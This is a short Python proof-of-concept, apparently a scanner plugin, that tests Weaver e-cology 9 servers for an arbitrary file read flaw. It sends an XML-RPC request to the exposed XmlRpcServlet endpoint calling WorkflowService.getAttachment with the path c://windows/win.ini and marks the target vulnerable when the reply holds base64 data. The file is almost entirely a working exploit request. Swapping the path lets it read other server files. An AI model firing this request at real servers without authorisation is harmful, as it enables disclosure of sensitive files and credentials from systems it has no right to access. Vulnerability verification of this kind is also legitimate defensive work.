import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微e-cology9接口XmlRpcServlet存在任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'application/xml',
        'Accept-Encoding': 'gzip',
        'Content-Length': '201'
    }
    data = '''
        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
        <methodName>WorkflowService.getAttachment</methodName>
        <params>
        <param>
        <value><string>c://windows/win.ini</string></value>
        </param>
        </params>
        </methodCall>
    '''
    vurl = urllib.parse.urljoin(url, "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'base64' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult